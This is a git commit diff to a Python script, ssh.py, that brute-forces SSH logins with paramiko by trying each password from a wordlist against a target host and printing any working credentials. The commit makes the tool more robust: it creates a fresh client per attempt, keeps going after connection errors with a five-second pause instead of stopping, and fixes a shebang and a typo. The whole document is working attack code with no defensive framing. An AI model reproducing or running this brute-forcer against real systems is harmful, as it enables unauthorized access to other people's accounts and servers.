12985513beeaecb088266598f5b40332cf2008b0
Zoraiz <44453814+sensehat@users.noreply.github.com>
2024-09-07 22:17:51 -0400

    Update ssh.py

--- Project/ssh.py
+++ Project/ssh.py
@@ -1,28 +1,33 @@
-#/usr/bin/python3
+#!/usr/bin/python3
 import paramiko
+import time
 
 def ssh_brute(target, username, wordlist):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-
     with open(wordlist, "r") as passwords:
         for password in passwords:
             password = password.strip()
 
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
             try:
                 ssh.connect(target, username=username, password=password)
-                print(f'[+] Credintials found! Username: {username} Password: {password}')
+                print(f'[+] Credentials found! Username: {username}, Password: {password}')
+                ssh.close()  
                 return True
             except paramiko.AuthenticationException:
                 print(f"[-] Failed password: {password}")
             except paramiko.SSHException:
                 print(f"[-] Connection error with {target}")
-                return False
+                time.sleep(5)  
             except Exception as e:
-                print(f"[-] Unknown error")
-                return False
+                print(f"[-] Unknown error: {e}")
+                time.sleep(5)  
+            finally:
+                ssh.close()  
+
+
+        print("[-] No valid credentials found.")
         return False
 
 
-
-            
